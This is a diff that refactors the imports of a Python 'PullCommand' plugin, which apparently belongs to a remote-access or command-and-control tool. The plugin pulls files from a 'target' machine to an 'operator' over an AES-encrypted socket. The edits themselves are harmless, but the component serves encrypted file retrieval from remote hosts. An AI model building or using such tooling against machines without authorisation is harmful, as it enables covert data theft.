@@ -1,7 +1,8 @@
 from Crypto.Cipher import AES
 from .interfaces import CommandPlugin
-import os
-import pathlib
+from os import makedirs
+from os.path import getsize, isdir
+from pathlib import Path
 import tqdm
 
 class PullCommand(CommandPlugin):
@@ -11,7 +12,7 @@ class PullCommand(CommandPlugin):
         # don't check if path is directory if call is recursive
         if targetPath != operatorPath:
             # if operatorPath is a directory, get file name from target path
-            if os.path.isdir(operatorPath):
+            if isdir(operatorPath):
                 shortname, _ = PullCommand.getShortname(targetPath, targetPath)
                 fromTarget = True
                 return (shortname, fromTarget)
@@ -33,7 +34,7 @@ class PullCommand(CommandPlugin):
             print("Error: couldn't parse command. Please check args and try again")
             return
         # expand '..', '.', and '~' to full path and remove trailing /'s
-        p = pathlib.Path(operatorPath)
+        p = Path(operatorPath)
         operatorPath = str(p.resolve())
         # get name of file to be saved
         shortname, nameFromTarget = PullCommand.getShortname(targetPath, operatorPath)
@@ -52,14 +53,14 @@ class PullCommand(CommandPlugin):
         # make directories that don't exist yet and open file for receiving
         if nameFromTarget:
             try:
-                os.makedirs(operatorPath)
+                makedirs(operatorPath)
             except FileExistsError:
                 pass
             pulledFile = open(operatorPath + "/" + shortname, "wb")
         else:
             try:
                 if "/" in operatorPath or "\\" in operatorPath:
-                    os.makedirs(operatorPath[:operatorPath.rindex(shortname)])
+                    makedirs(operatorPath[:operatorPath.rindex(shortname)])
             except FileExistsError:
                 pass
             pulledFile = open(operatorPath, "wb")
@@ -108,10 +109,10 @@ class PullCommand(CommandPlugin):
             # Error: couldn't parse command -- terminate command
             return
         # expand '..', '.', and '~' to full path
-        p = pathlib.Path(targetPath)
+        p = Path(targetPath)
         targetPath = str(p.resolve())
         # make sure path points to an existing file
-        if os.path.isdir(targetPath) or not p.exists():
+        if isdir(targetPath) or not p.exists():
             # send error message to operator and terminate command
             cipher = AES.new(cipherKey, AES.MODE_EAX)
             nonce = cipher.nonce
@@ -121,7 +122,7 @@ class PullCommand(CommandPlugin):
             socket.sendall(ciphertext)
             return
         # send file size
-        filesize = os.path.getsize(targetPath)
+        filesize = getsize(targetPath)
         cipher = AES.new(cipherKey, AES.MODE_EAX)
         nonce = cipher.nonce
         ciphertext, tag = cipher.encrypt_and_digest(str(filesize).encode())
